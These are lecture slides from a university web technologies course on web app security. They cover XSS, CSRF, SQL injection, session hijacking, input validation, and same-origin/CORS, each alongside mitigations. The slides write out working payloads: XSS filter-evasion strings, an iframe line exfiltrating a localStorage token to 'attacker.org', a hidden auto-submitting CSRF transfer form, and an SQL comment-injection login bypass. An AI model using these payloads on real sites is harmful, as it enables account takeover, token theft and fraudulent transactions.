## WEB APPLICATION SECURITY

Luigi Libero Lucio Starace, PhD 

luigiliberolucio.starace@unina.it 

https://luistar.github.io 

https://www.docenti.unina.it/luigiliberolucio.starace 

## WEB APPLICATION SECURITY

• Web Apps play a crucial role in modern business and communication 

• Securing them is essential to prevent unauthorized access, data breaches, and other malicious activities. 

• Web App Security refers to the measures and practices implemented to protect web applications from security threats. 

• The goal of web application security is to ensure the confidentiality, integrity, and availability of both the application and the data it handles. 

## WEB APPLICATION SECURITY

• Security in Web Apps needs to be handled at different levels 

## • Network-level Security

• Concerned with the communication between the Web App and the Internet 

• Focuses on data encryption (HTTPS), firewalls filtering malicious HTTP requests, Monitoring and Logging to detect suspicious patterns, … 

## • Application-level Security

• Concerned with security measures implemented withing the Web App 

• Focuses on Authentication and Authorization, Input Validation to ensure data integrity, Session Management, ensuring data confidentiality, … 

## NETWORK-LEVEL

• Focuses on protecting communication channels and infrastructure 

• Protects against attacks targeting the network layer (e.g.: sniffing, MitM, …) 

• Examples: filtering invalid HTTP requests or blocking DDoS attacks with a Firewall, properly encrypting traffic 

## APPLICATION-LEVEL

• Focuses on internal mechanisms and functionalities of the Web App 

Mitigates risks associated with the application itself 

Attacks may be concealed within valid HTTP requests and exploit vulnerabilities in the way the App is implemented to achieve malicious goals! 

## WEB APPLICATION SECURITY

• Network-level security is a topic for the Computer Networks / Network Security courses. 

• In the Web Technologies course, we are concerned with how to design and develop modern web apps. 

• We will therefore focus only on Application-level security, and make sure that the application we develop do not contain vulnerabilities! 

• We will also explore the key security mechanisms implemented in modern web browsers (e.g.:, CORS), so we know how to work with them 

## HOW BAD IS THE SITUATION?

• Quite bad… 

• A significant number of web apps is affected by at least one vulnerability 

The OWASP (Open Worldwide Application Security Project) is a non-profit organization that collects vulnerability data and publishes periodic reports on the most prevalent vulnerability classes (OWASP Top 10) 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/3290d1c7557ab9106c55efe2421c38c9457a032eb7ca1ebbe380aec02e46c27f.jpg)


## COMMON WEB APP VULNERABILITIES

In the remaining slides, we will focus on a (small) subset of vulnerabilies, that occur frequently in web applications, can cause very serious damage, and can be easily mitigated or prevented! 

• Cross-site Scripting (XSS) 

• Cross-site Request Forgery (XSRF or CSRF) 

• SQL Injections 

• Session Attacks (Session Hijacking) 

• Insufficient Input Validation leading to attacks on data integrity 

## SUBJECT SYSTEMS

• We will also demonstrate these attacks on real web applications and with a modern web browser! 

• For some attacks, we will use the OWASP Juice-shop web app 

• Modern web app 

• Angular frontend 

• Express backend with Sequelize (and more) 

• For others, we will use the Express To-do List traditional web app we developed back in Lecture 14 

Traditional web app implemented using Express 

## CROSS-SITE SCRIPTING

## CROSS-SITE SCRIPTING (XSS)

• XSS attacks aim at injecting malicious client-side code into otherwise trusted websites 

• The attacker exploits flaws in the web app to send malicious clientside code to other users 

• The flaws that enable such attacks occur when a web app displays untrusted input (e.g.: coming from users) without proper validation or escaping (encoding) 

## PERFORMING AN XSS ATTACK

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/5a1266c75f544f4073f0a1ab93551fd07e0a4ff220539e67b729f3a475187c76.jpg)


## PERFORMING AN XSS ATTACK

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/3c52d99f92cc21bf7879c8ccb51519568b47b202b15910e60edc0d242badabd1.jpg)


## XSS: CONSEQUENCES

• Injected client-side code is executed by the browser as if it were trusted code (it’s indistinguishable from the legit JS!) 

• Users can be attacked by simply clicking on a malicious link 

• Click <a href="https%3A%2F%2Flegit.app%3Fq%3D%3Cscript%3E alert%28%22XSS%22%29%3C%2Fscript%3E">here</a> 

• It can do everything trusted JavaScript can 

• Access and manipulate cookies (e.g.: session ids!) 

• Access localStorage and sessionStorage (e.g.: tokens or other private data!) 

• Manipulate the web page (e.g.: alter links, forms, add content) 

• Perform actions (e.g.: generate click events, submit forms as the user, …) 

## MITIGATING XSS VULNERABILITIES

• User input that is displayed in web pages should be treated very carefully and sanitized 

• We may apply filters on input data 

• E.g.: remove occurrences of «<script>» and «</script>», or remove any occurrence of «<» and «>» 

• Seems reasonable enough? 

• Well, XSS payloads can be way more tricky than that, and dedicated filter evasion techniques exist! 

## XSS ATTACK WITH FILTER EVASION

OWASP Web Tech & Juice Shop 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/c7e4fd3a8c474363d8d94bfc315be21d65fe621af5c142f0c008ff6581b4a7c2.jpg)


## XSS ATTACK WITH FILTER EVASION

## • Oh no! Our original payload is filtered!

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/44049752fe972dc14e2732a5962016ee29452f99860e51dbd873edaa980236c0.jpg)


## XSS FILTER EVASION

There’s other ways to inject JavaScript code! 

• <iframe src="javascript:alert('XSS')"> 

```html
- <iframe src="jav ascript:alert('XSS')"> //tab char 
```

• <iframe src="jav&#x09;ascript:alert('XSS')"> 

• <img src=x onerror="&#0000106&#0000097&#0000118&#0000097 &#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#000 0058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040& #0000039&#0000088&#0000083&#0000083&#0000039&#0000041"> 

• Check out the OWASP website for a filter evasion cheatsheet 

## XSS ATTACK WITH FILTER EVASION

## • Still, we can inject JavaScript code into the page!

OWASP Web Tech & Juice Shop 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/19167c2d934b44e49a86c4bc34ad016daedd283720b899c780c09507da92f586.jpg)


No results found Try adjusting your search to find what you're looking for. 

## XSS: LEAKING A PRIVATE TOKEN

• Accessing the API Token or the session cookie is fun, but an attacker can’t do much without getting it out of the victim’s browser 

• Several ways to do that: 

• Redirect the window (or an iframe) to malicious URL 

• Add an image whose source is the malicious URL (blocked by some modern browsers) 

• Load a stylesheet whose href is a malicious URL 

• <iframe src="javascript:window.location.href = `https://attacker.org?token=${localStorage.getItem('token')}`"> </iframe> 

## MITIGATING XSS VULNERABILITIES

• Do not rely only on filtering approaches unless absolutely necessary 

• The best way to address the problem is to properly escape (sanitize) inputs when inserting them into the web pages 

• Convert dangerous characters $( { \mathrm { e . g . } } ; { \mathrm { < } } , { \mathrm { > } } , { \mathrm { " } } , { \mathrm { , . . . } } )$ to harmless HTMLEntities 

• Dedicated solutions exist in most frameworks/programming languages 

• Dedicated libraries can be used, e.g.: sanitize for Node.js 

<script>alert("XSS")</script> 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/54514628149291d597b6c00a25535f1623248d5e25717798563dfcb157d147b4.jpg)


&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; 

Search Results - <script>alert("XSS")</script> 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/97c54e572f611602cb29fa62fbe7270232a3babfa89116e57b66d6aba85a67be.jpg)


## ANGULAR XSS SECURITY MODEL

• Angular automatically sanitizes all untrusted data that is bound or interpolated in a template 

• By default, all data is untrusted 

• You can explicitly mark some data as trusted using the DomSanitizer 

• DomSanitizer include metods such as 

• bypassSecurityTrustHtml(value: string): SafeHtml 

• These methods can mark data as trusted in specific contexts, bypassing the default security mechanisms 

• Of course, they must be used with caution! 

## FIXING THE XSS IN THE WEB TECH SHOP

```txt
filterTable () {
    let queryParam: string = this.route.snapshot.queryParams.q
    if (queryParam) {
    queryParam = queryParam.trim()
    this.dataSource.filter = queryParam.toLowerCase()
    - this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)
    + this.searchValue = queryParam
    /* other code omitted for brevity */
    }
} 
```

## CROSS-SITE REQUEST FORGERY

## CROSS-SITE REQUEST FORGERY (CSRF/XSRF)

• These attacks aim at forcing an end-user to execute unintended actions on a web application they are currently authenticated on 

• Unintended actions may include state-changing operations such as transferring funds, changing the email associated with an account, … 

• If the victim is a user with administration privileges, the attack can result in compromising the entire web application 

## CSRF ATTACKS: DYNAMICS

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/a07a239e462e015f4cef7901a73e483ba173102d6963b6bc0ef45a6708e99550.jpg)


POST /login usr=Gavinelli&pwd=RobotFriend 

200 OK Set-Cookie sid=xYs…z76 

POST /transfer Cookie sid=xYs…z76 to=Gabonzo&amount=100.00 

200 OK 

Target Web App 

(Bank) 

Victim 

Malicious Web App 

❶ User clicks on a malicious link from the browser they are currently logged-in 

POST /transfer to=EvilZampurian&amount=999.99 

+ Cookie sid=xYs…z76 

❷ The malicious page submits a form to the legit web app, as if the user was trying to perform a bank transfer to the attacker 

❸ The victim’s browser notices that the request is going to the legit app, and sends the auth cookie back 

## CSRF ATTACKS: EXAMPLE

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Totally not evil page!</title>
</head>
<body>
    <h1>Oops, this website is currently down. Check back soon.</h1>
    <form style="display:none;" method="POST" action="https://bank.com/transfer">
    <input type="text" name="to" value="EvilZampurian">
    <input type="number" name="amount" value="999.99">
    <input type="submit" id="submit" value="submit">
    </form>
    <script>
    document.getElementById("submit").click();
    </script>
</body>
</html> 
```

## CSRF ATTACK: EXAMPLE ON TO-DO LIST

• The To-do List web app we built using Express is vulnerable to CSRF! 

• Let’s create a web page that exploits that vulnerability to add arbitrary to-do items to the to-do list of an unaware user! 

• Will the lecturer be able to hack the sophisticated Express To-do List App? 

• Live demo time! 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/3bce6b79237f0e63d40aa6e3b74dbf32e55b8a9396a6e1113bb90c3588a4fa98.jpg)


## MITIGATING CSRF ATTACKS

• The best way to mitigate CSRF vulnerabilities is to use a token-based approach (i.e., synchronizer token pattern) 

• Idea: 

• Web App generates a session-specific CSRF token, and saves it in the Session 

• The CSRF token is included, in a hidden field, in the sensitive forms 

• Upon submission, the CSRF token is transferred again to the web app 

• The web app verifies that the CSRF token received with the form is the same as the one it generated and saved in the current session 

• An attacker won’t be able to guess the CSRF token! 

• Provided no XSS vulnerabilities exist! 

• Provided the CSRF tokens are not predicatable! 

## MITIGATING CSRF ATTACKS: EXAMPLE

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Bank.com | Safest Bank Around</title>
</head>
<body>
    <h1>Bank Transfer Page</h1>
    <form method="POST" action="/transfer">
    <input type="text" name="to" value="">
    <input type="number" name="amount" value="">
    <input type="hidden" name="csrf" value="x5è1€">
    <input type="submit" value="submit">
    </form>
    </body>
</html> 
```

## Session data

## Session id: ah5…f435

## Session id: 4f4…ssd2

## IMPLEMENTING CSRF COUNTERMEASURES

• Most frameworks include CSRF protection capabilities 

• Many middlewares exist for Express (e.g.: tiny-csrf) 

• Angular includes CSRF countermeasures 

• Spring protects POST methods by default with a token-based mechanism 

• If CSRF protection capabilities are available, you should read the documentation and make sure you use them correctly! 

• If not, you should still implement CSRF protection on your own for sensitive operations! 

## SQL INJECTIONS

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/1477f4de259be64c63ddfa3ab2db04a194c76efe2d0a881fd164b5a234496dea.jpg)


## SQL INJECTIONS

• SQL Injections consist in injecting malicious code coming from unsanitized user inputs into database queries 

• Don’t get fooled by the name: NoSQL database queries can be just as vulnerable 

• These attacks can result in leaking private data, modifying (create, update, delete) database data, access control violations, and in some cases even arbitrary code execution on the database server. 

## SQL INJECTION VULNERABILITIES

• Suppose the server-side code for user authentication looks like the one shown below 

• Request parameters email and password are directly inserted in the SQL query that is executed on the database 

```txt
models.sequelize.query(`
SELECT * FROM Users
WHERE email = '${req.body.email || ''}'
AND password = Sund{security.hash(req.body.password || '')}
AND deletAt IS NULL`, { model: UserModel, plain: true })
.then((authenticatedUser: { data: User }) => {
    /* user found, handle authentication */
}.catch(err){
    next(err);
} 
```

## SQL INJECTION VULNERABILITIES

• Normally, when a users tries to log in, the intended values are substituted in the query, without altering its structure and nature 

• The login feature works as intended 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/77e4d9b9b6d483cc465c6acb4fa9e4acb91bb5aaa1d950e846374bb00203d966.jpg)


```sql
SELECT *
FROM Users
WHERE email = 'luigi@webtech-sh.op' AND password = 'webtechs!' AND deletedAt IS NULL 
```

## SQL INJECTION VULNERABILITIES

• However, we know that we cannot trust user inputs! For a starter, an attacker would be able to login as luigi! 

• What if the attacker inserts luigi@webtech-sh.op'-- as the email? 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/74b5ba3035c125a5afafbbf36881ae384f59fbaec710b9a2f6db3dfe7699a24d.jpg)


```sql
SELECT *
FROM Users
WHERE email = 'luigi@webtech-sh.op' -- AND password = 'dontknowthislol' AND deletedAt IS NULL 
```

Remember that «--» start single line comments in SQL! 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/178482ebd8ab067d576ecaf136e5c7cebc96ca4c8917aacf33160d5e02247adc.jpg)


## OBLIGATORY EXPLOITS OF A MOM BY XKCD

HI, THIS IS YOUR SON'S SCHOOL. WE'RE HAVING SOME COMPUTER TROUBLE. 

OH, DEAR - DID HE BREAKSOMETHING? 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/53adf641c91c6af50b892c317d4dc392d2a022a91308437297955e0d74f53a48.jpg)


DID YOU REALLY NAME YOUR SON Robert'); DROP TABLE Students;--? 

OH.YES. LITTLE BOBBY TABLES, WE CALL HIM. 

WELL, WE'VE LOST THIS YEAR'S STUDENT RECORDS. I HOPE YOU'RE HAPPY. 

AND I HOPE YOU'VE LEARNED TO SANITIZE YOUR DATABASE INPUTS. 

https://xkcd.com/327 

## PREVENTING SQL INJECTIONS

## • Use prepared statements with parametrized queries

• Use stored procedures 

```typescript
models.sequelize.query(
    SELECT * FROM Users
    WHERE email = $1 AND password = $2 AND deletedAt IS NULL',
    { bind: [ req.body.email, security.hash(req.body.password) ],
    model: models.User, plain: true })
.then((authenticatedUser: { data: User }) => {
    /* user found, handle authentication */
}.catch(err){
    next(err);
} 
```

## SESSION HIJACKING

Victim 

## SESSION HIJACKING

• Attacks aimed at compromising the session token 

• Typically performed by stealing a valid token, or by predicting one 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/6770ce47eda21710f0fb13a2c46f24218e7b865aa93c17539b956128ddb8a29e.jpg)


![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/8924cceaeafefbe6129821b32e313b1342f7c6808b078d893cb3697172c0f520.jpg)



Web App vulnerable to XSS attacks


![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/6c0dad3d8bf724cee03399435fb9dcf6d64ff6dbfc7695bf4a307e30053d830d.jpg)


## INSUFFICIENT INPUT VALIDATION

## INPUT VALIDATION

• Proper input validation is a great part of ensuring data integrity in a web application 

Client-side validation is a great practice for usability • Errors are presented to the user as soon as possibile 

• However, client-side validation can also be completely avoided by attackers, who can access and manipulate client-side code, or generate HTTP requests directly! 

• Validation should always be performed also on the server-side! 

## EVADING INPUT VALIDATION

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/078147b89eb97c8b90a5d2c3ddf366df45e5b0c685f8c440b93d4504f248ce7c.jpg)


• In the OWASP Web Tech and Juice Shop, customers can leave feedbacks to the store 

• The GUI makes sure that only rating between 1 and 5 can be selected. 

• Will we be able to insert a devastating 0-star rating? 

## EVADING INPUT VALIDATION

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/9c65e28145f888407ca01025e704e3f0c62853870c79eff02c2a84d23d268a0c.jpg)


• Upon inserting a feedback, we inspect the network requests in the Browser Dev Tools 

• A POST request to /api/Feedbacks/ is sent 

<table><tr><td colspan="7">Inspector Console ↑↓ Network Storage Debugger {} Style Editor &gt;&gt; ... ×</td></tr><tr><td colspan="4">Filter URLs</td><td>[] + 🔗</td><td>Disable Cache</td><td>No Throttling ✦</td></tr><tr><td colspan="7">All HTML CSS JS XHR Fonts Images Media WS Other</td></tr><tr><td>Status</td><td>Method</td><td>Domain</td><td>File</td><td>Initiator</td><td>Type</td><td>Size</td></tr><tr><td>201</td><td>POST</td><td>localhost:3000</td><td>/api/Feedbacks/ polyfills.js:1 (xhr)</td><td>json</td><td></td><td>189 B</td></tr><tr><td>200</td><td>GET</td><td>localhost:3000</td><td>whoami</td><td>polyfills.js:1 (xhr)</td><td>json</td><td>125 B</td></tr><tr><td>6 requests</td><td colspan="2">728 B / 3.10 kB transferred</td><td colspan="4">Finish: 3.72 min</td></tr><tr><td>Headers</td><td>Cookies</td><td>Request</td><td>Response</td><td>Timings</td><td>Stack Trace</td><td></td></tr><tr><td colspan="7">Filter Request Parameters</td></tr><tr><td colspan="7">JSON Raw</td></tr><tr><td colspan="7">captcha: &quot;80&quot;</td></tr><tr><td colspan="7">captchald: 1</td></tr><tr><td colspan="7">comment: &quot;Example review (**@webtech-sh.op)&quot;</td></tr><tr><td colspan="7">rating: 3</td></tr><tr><td colspan="7">UserId: 2</td></tr></table>

```json
{
    "UserId": 2,
    "captchaId": 1,
    "captcha": "80",
    "comment": "Example review (***@webtech-sh.op)",
    "rating": 3
} 
```

## EVADING INPUT VALIDATION

## • The request body is

• What if we send a modified request, with "rating": 0? 

• We also can do that right away from the Browser Dev Tools! • Click on “Resend” from the “Headers” details tab of the Request 

# SECURITY SERVICES PROVIDED BY WEB BROWSERS

## WEB BROWSER SECURITY MODEL

• Modern browsers enforce a strict security model to improve security and block some kinds of attacks. 

• As a web developer, you need to be aware of the security mechanisms in place and how to work with them 

• One of such mechanisms is the Same-origin Policy 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/b87a5e265805b0e06ef4c932a397f29b39a773981ba0da4292457cd35dff8253.jpg)


## THE SAME-ORIGIN POLICY

• By default, a document or script is only allowed to interact with resources from the same origin 

• Same origin means the URL has the same protocol, port, and host 

• Consider the document at http://store.webtech.com/cat/index.html 

<table><tr><td>URL</td><td>Same-origin</td><td>Reason</td></tr><tr><td>http://store.webtech.com/pages/about.html</td><td>✓</td><td>Only the path differs</td></tr><tr><td>http://store.webtech.com/img/logo.png</td><td>✓</td><td>Only the path differs</td></tr><tr><td>https://store.webtech.com/page.html</td><td>✕</td><td>Different protocol</td></tr><tr><td>http://store.webtech.com:81/dir/page.html</td><td>✕</td><td>Different port (http is port 80 by default)</td></tr><tr><td>http://course.webtech.com/cat/index.html</td><td>✕</td><td>Different host</td></tr></table>

## THE SAME-ORIGIN POLICY

• Even though minor differences exist across browsers, the same origin policy generally applies to data all fetched by JavaScript code using fetch() or XMLHttpRequest 

• Suppose we have a web page at http://localhost:3001/cors.html and the Express To-do List App at http://localhost:3000 

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/9e6bd5ed2d8685644f7e5c11a1fc2579f6b379dba74d13a67094f0f23ac12ca8.jpg)



Luigi Libero Lucio Starace, Ph.D. - University of Naples Federico II - Web Technologies Course - Lecture 23 - Web App Security


## THE SAME-ORIGIN POLICY

```javascript
//in the web page at http://localhost:3001
function doFetch(){
    fetch("http://localhost:3000/").then(data => {
    data.json().then(data => {
    console.log(data)
    })
}).catch(err => {
    console.log(err.message)
});
} 
```

## CROSS-ORIGIN RESOURCE SHARING (CORS)

• Sometimes we need to access content from different origins! • And, in fact, we already did so! 

• The Cross-origin Resource Sharing (CORS) mechanism allows a server to «opt-out» of the Same-origin Policy and specify that its content can be accessed also from some origins other than its own 

• Server can include specific headers in their responses to declare that the data can be accessed by specific origins 

## CORS: HEADERS

## • CORS is header-based

• The browser attaches an Origin header to outgoing fetch requests 

• The server can include in its response a Access-Control-Allow-Origin header 

• The value of this header specifies which origins are allowed to use the data 

• E.g.: Access-Control-Allow-Origin: * means that every origin is allowed! 

• E.g.: Access-Control-Allow-Origin: http://localhost:3001 

• If no header is specified, the default is that cross-origin requests are forbidden 

• Browsers check that Access-Control-Allow-Origin header matches with Origin 

• If so, client code is allowed to access the data 

• Otherwise, the request is blocked 

## CORS: VISUALIZED

![image](https://cdn-mineru.openxlab.org.cn/result/2026-10-30/3b0a8e08-9601-493c-b95c-aa39f3e8d9c2/01741b2d22634e63e231a414537f6c7c1ec92044bf28e8be2716490be8d67a58.jpg)


## REFERENCES (1/2)

Cross Site Scripting (XSS) Attacks https://owasp.org/www-community/attacks/xss/ 

Gamified XSS practice https://xss-game.appspot.com/ 

Cross Site Request Forgery (CSRF) Attacks https://owasp.org/www-community/attacks/csrf 

• SQL Injection Attacks https://owasp.org/www-community/attacks/SQL_Injection 

## REFERENCES (2/2)

Same-origin Policy https://developer.mozilla.org/en-US/docs/Web/Security/Sameorigin_policy 

Cross-Origin Resource Sharing (CORS) https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS 

Web Application Security Guide (from Wikibooks) https://en.wikibooks.org/wiki/Web_Application_Security_Guide 